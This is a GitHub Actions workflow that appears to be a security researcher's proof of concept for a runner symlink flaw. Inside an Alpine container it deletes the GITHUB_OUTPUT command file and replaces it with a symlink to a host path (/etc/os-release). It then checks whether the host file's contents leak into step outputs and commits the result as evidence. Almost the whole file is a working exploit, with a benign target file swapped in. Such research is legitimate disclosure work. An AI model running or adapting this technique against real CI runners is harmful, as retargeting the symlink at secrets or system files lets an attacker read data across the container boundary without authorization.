name: runner-filecommand-symlink-poc

on:
  push:
    branches:
      - research/runner-filecommand-symlink-validation
  workflow_dispatch:

permissions:
  contents: write

jobs:
  poc:
    runs-on: ubuntu-latest

    container:
      image: alpine:3.22

    steps:
      - uses: actions/checkout@v4

      - name: Show container identity
        id: container
        shell: sh
        run: |
          echo "=== CONTAINER /etc/os-release ==="
          cat /etc/os-release

          . /etc/os-release
          echo "container_pretty=$PRETTY_NAME" >> "$GITHUB_OUTPUT"

      - name: Replace GITHUB_OUTPUT with host-targeting symlink
        id: hijack
        shell: sh
        run: |
          echo "Original command file:"
          ls -l "$GITHUB_OUTPUT"

          rm -f "$GITHUB_OUTPUT"
          ln -s /etc/os-release "$GITHUB_OUTPUT"

          echo "Replaced command file:"
          ls -l "$GITHUB_OUTPUT"

          echo "Container resolves symlink as:"
          cat "$GITHUB_OUTPUT"

      - name: Verify host file read
        shell: sh
        env:
          CONTAINER_PRETTY: ${{ steps.container.outputs.container_pretty }}
          HOST_PRETTY: ${{ steps.hijack.outputs.PRETTY_NAME }}
          HOST_ID: ${{ steps.hijack.outputs.ID }}
          HOST_VERSION: ${{ steps.hijack.outputs.VERSION_ID }}
        run: |
          echo "=== comparison ==="
          echo "CONTAINER_PRETTY=$CONTAINER_PRETTY"
          echo "HOST_PRETTY=$HOST_PRETTY"
          echo "HOST_ID=$HOST_ID"
          echo "HOST_VERSION=$HOST_VERSION"

          if [ -n "$HOST_PRETTY" ] && [ "$HOST_PRETTY" != "$CONTAINER_PRETTY" ]; then
            echo "HOST_FILE_READ_CONFIRMED=true"
            printf 'HOST_FILE_READ_CONFIRMED=true\nCONTAINER_PRETTY=%s\nHOST_PRETTY=%s\nHOST_ID=%s\nHOST_VERSION=%s\n' \
              "$CONTAINER_PRETTY" "$HOST_PRETTY" "$HOST_ID" "$HOST_VERSION" > runner-symlink-evidence.txt
          else
            echo "HOST_FILE_READ_CONFIRMED=false"
            printf 'HOST_FILE_READ_CONFIRMED=false\nCONTAINER_PRETTY=%s\nHOST_PRETTY=%s\n' \
              "$CONTAINER_PRETTY" "$HOST_PRETTY" > runner-symlink-evidence.txt
          fi

      - name: Persist synthetic validation evidence
        shell: sh
        run: |
          apk add --no-cache git
          git config user.name "Security Research Validation"
          git config user.email "security-research@users.noreply.github.com"
          git add runner-symlink-evidence.txt
          git commit -m "Record runner symlink validation evidence [skip ci]"
          git push origin HEAD:research/runner-filecommand-symlink-validation
